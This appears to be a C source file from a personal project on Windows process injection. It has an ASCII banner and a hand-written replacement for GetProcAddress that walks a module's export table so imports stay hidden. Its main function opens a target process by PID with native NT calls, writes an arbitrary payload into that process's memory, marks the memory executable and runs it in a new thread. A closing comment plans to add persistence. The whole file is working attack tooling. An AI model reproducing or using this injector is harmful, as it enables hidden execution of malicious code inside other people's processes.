#include "Injection.h"





VOID PrintBanner(VOID) {
    printf(
        "     _  ___________   ___  ____  ____       _         __  _                                    \n"
        "    / |/ /_  __/ _ | / _ \\/  _/ /  _/__    (_)__ ____/ /_(_)__  ___                           \n"
        "   /    / / / / __ |/ ___// /  _/ // _ \\  / / -_) __/ __/ / _ \\/ _ \\                        \n"
        "  /_/|_/ /_/ /_/ |_/_/  /___/ /___/_//_/_/ /\\__/\\__/\\__/_/\\___/_//_/                       \n"
        "                                    |___/                                                      \n"
        "                                                                                               \n"
        "  This is just my version of different techniques learned for process injection                \n"
    );
}



/*
   _____      _     _____            _                                     _
 |_   _|    | |   |  __ \          | |                                   | |
   | |  __ _| |_  | |__) |___ _ __ | | __ _  ___ ___ _ __ ___   ___ _ __ | |_
   | | / _` | __| |  _  // _ \ '_ \| |/ _` |/ __/ _ \ '_ ` _ \ / _ \ '_ \| __|
  _| || (_| | |_  | | \ \  __/ |_) | | (_| | (_|  __/ | | | | |  __/ | | | |_
 |_____\__,_|\__| |_|  \_\___| .__/|_|\__,_|\___\___|_| |_| |_|\___|_| |_|\__|
                             | |
                             |_|
*/


// git test

FARPROC GetProcAddressReplacement(IN HMODULE hModule, IN LPCSTR lpApiName) {

    // we do this to avoid casting at each time we use 'hModule'
    PBYTE pBase = (PBYTE)hModule;

    // getting the dos header and doing a signature check
    PIMAGE_DOS_HEADER	pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;
    if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE)
        return NULL;

    // getting the nt headers and doing a signature check
    PIMAGE_NT_HEADERS	pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);
    if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
        return NULL;

    // getting the optional header
    IMAGE_OPTIONAL_HEADER	ImgOptHdr = pImgNtHdrs->OptionalHeader;

    // we can get the optional header like this as well																								
    // PIMAGE_OPTIONAL_HEADER	pImgOptHdr	= (PIMAGE_OPTIONAL_HEADER)((ULONG_PTR)pImgNtHdrs + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER));

    // getting the image export table
    PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    // getting the function's names array pointer
    PDWORD FunctionNameArray = (PDWORD)(pBase + pImgExportDir->AddressOfNames);
    // getting the function's addresses array pointer
    PDWORD FunctionAddressArray = (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);
    // getting the function's ordinal array pointer
    PWORD  FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);


    // looping through all the exported functions
    for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++) {
        // getting the name of the function
        CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);

        // getting the address of the function through its ordinal
        PVOID pFunctionAddress = (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);

        // searching for the function specified
        if (strcmp(lpApiName, pFunctionName) == 0) {
            // printf("[ %0.4d ] FOUND API -\t NAME: %s -\t ADDRESS: 0x%p  -\t ORDINAL: %d\n", i, pFunctionName, pFunctionAddress, FunctionOrdinalArray[i]);
            return pFunctionAddress;
        }

        // printf("[ %0.4d ] NAME: %s -\t ADDRESS: 0x%p  -\t ORDINAL: %d\n", i, pFunctionName, pFunctionAddress, FunctionOrdinalArray[i]);
    }


    return NULL;
}

/*
  _____       _           _
 |_   _|     (_)         | |
   | |  _ __  _  ___  ___| |_ ___  _ __
   | | | '_ \| |/ _ \/ __| __/ _ \| '__|
  _| |_| | | | |  __/ (__| || (_) | |
 |_____|_| |_| |\___|\___|\__\___/|_|
            _/ |
           |__/
*/

BOOL NTAPIInjection(
    _In_ CONST DWORD PID,
    _In_ CONST PBYTE Payload,
    _In_ CONST SIZE_T PayloadSize
) {

    BOOL      State = TRUE;
    PVOID     Buffer = NULL;
    HANDLE    ThreadHandle = NULL;
    HANDLE    ProcessHandle = NULL;
    HMODULE   NtdllHandle = NULL;
    DWORD     OldProtection = 0;
    SIZE_T    BytesWritten = 0;
    NTSTATUS  Status = 0;
    CLIENT_ID CID = { (HANDLE)PID, NULL };
    OBJECT_ATTRIBUTES OA = { sizeof(OA),  NULL };

    NtdllHandle = GetModuleHandleW(L"NTDLL");
    if (NULL == NtdllHandle) {
        WARN("[GetModuleHandleW] failed, error: 0x%lx", GetLastError());
        return FALSE;
    }
    OKAY("[0x%p] got the address of NTDLL!", NtdllHandle);

    fn_NtOpenP p_NtOpenP = (fn_NtOpenP)GetProcAddressReplacement(NtdllHandle, "NtOpenProcess");
    fn_NtAllocateVM p_NtAllocateVM = (fn_NtAllocateVM)GetProcAddressReplacement(NtdllHandle, "NtAllocateVirtualMemory");
    fn_NtWriteVM p_NtWriteVM = (fn_NtWriteVM)GetProcAddressReplacement(NtdllHandle, "NtWriteVirtualMemory");
    fn_NtProtectVM p_NtProtectVM = (fn_NtProtectVM)GetProcAddressReplacement(NtdllHandle, "NtProtectVirtualMemory");
    fn_NtCreateTEx p_NtCreateTEx = (fn_NtCreateTEx)GetProcAddressReplacement(NtdllHandle, "NtCreateThreadEx");
    fn_NtWaitFSO p_NtWaitFSO = (fn_NtWaitFSO)GetProcAddressReplacement(NtdllHandle, "NtWaitForSingleObject");
    fn_NtFreeVM p_NtFreeVM = (fn_NtFreeVM)GetProcAddressReplacement(NtdllHandle, "NtFreeVirtualMemory");
    fn_NtCl p_NtCl = (fn_NtCl)GetProcAddressReplacement(NtdllHandle, "NtClose");

    if (!p_NtOpenP || !p_NtAllocateVM || !p_NtWriteVM ||
        !p_NtProtectVM || !p_NtCreateTEx || !p_NtWaitFSO ||
        !p_NtFreeVM || !p_NtCl) {

        printf("Failed to resolve one or more NTAPI functions.\n");
        return FALSE;
    }


    Status = p_NtOpenP(&ProcessHandle, PROCESS_ALL_ACCESS, &OA, &CID);
    if (STATUS_SUCCESS != Status) {
        PRINT_ERROR("NtOpenProcess", Status);
        return FALSE; /* no point in continuing if we can't even get a handle on the process */
    }
    OKAY("[0x%p] got a handle on the process (%ld)!", ProcessHandle, PID);

    Status = p_NtAllocateVM(ProcessHandle, &Buffer, 0, &PayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (STATUS_SUCCESS != Status) {
        PRINT_ERROR("NtAllocateVirtualMemory", Status);
        State = FALSE; goto CLEANUP;
    }
    OKAY("[0x%p] [RW-] allocated a %zu-byte buffer with PAGE_READWRITE [RW-] permissions!", Buffer, PayloadSize);


    Status = p_NtWriteVM(ProcessHandle, Buffer, Payload, PayloadSize, &BytesWritten);
    if (STATUS_SUCCESS != Status) {
        PRINT_ERROR("NtWriteVirtualMemory", Status);
        State = FALSE; goto CLEANUP;
    }
    OKAY("[0x%p] [RW-] wrote %zu-bytes to the allocated buffer!", Buffer, BytesWritten);

    Status = p_NtProtectVM(ProcessHandle, &Buffer, &PayloadSize, PAGE_EXECUTE_READ, &OldProtection);
    if (STATUS_SUCCESS != Status) {
        PRINT_ERROR("NtProtectVirtualMemory", Status);
        State = FALSE; goto CLEANUP;
    }
    OKAY("[0x%p] [R-X] changed allocated buffer protection to PAGE_EXECUTE_READ [R-X]!", Buffer);

    Status = p_NtCreateTEx(&ThreadHandle, THREAD_ALL_ACCESS, &OA, ProcessHandle, Buffer, NULL, FALSE, 0, 0, 0, NULL);
    if (STATUS_SUCCESS != Status) {
        PRINT_ERROR("NtCreateThreadEx", Status);
        State = FALSE; goto CLEANUP;

    }


    OKAY("[0x%p] successfully created a thread!", ThreadHandle);
    INFO("[0x%p] waiting for thread to finish execution...", ThreadHandle);
    Status = p_NtWaitFSO(ThreadHandle, FALSE, NULL);
    INFO("[0x%p] thread finished execution! beginning cleanup...", ThreadHandle);





    /*
       _____ _
      / ____| |
     | |    | | ___  __ _ _ __  _   _ _ __
     | |    | |/ _ \/ _` | '_ \| | | | '_ \
     | |____| |  __/ (_| | | | | |_| | |_) |
      \_____|_|\___|\__,_|_| |_|\__,_| .__/
                                     | |
                                     |_|
    */




CLEANUP:

    if (Buffer) {
        Status = p_NtFreeVM(ProcessHandle, &Buffer, &PayloadSize, MEM_DECOMMIT);
        if (STATUS_SUCCESS != Status) {
            PRINT_ERROR("NtFreeVirtualMemory", Status);
        }
        else {
            INFO("[0x%p] decommitted allocated buffer from process memory", Buffer);
        }
    }

    if (ThreadHandle) {
        p_NtCl(ThreadHandle);
        INFO("[0x%p] handle on thread closed", ThreadHandle);
    }

    if (ProcessHandle) {
        p_NtCl(ProcessHandle);
        INFO("[0x%p] handle on process closed", ProcessHandle);
    }

    return State;

}

// i need to add in persistance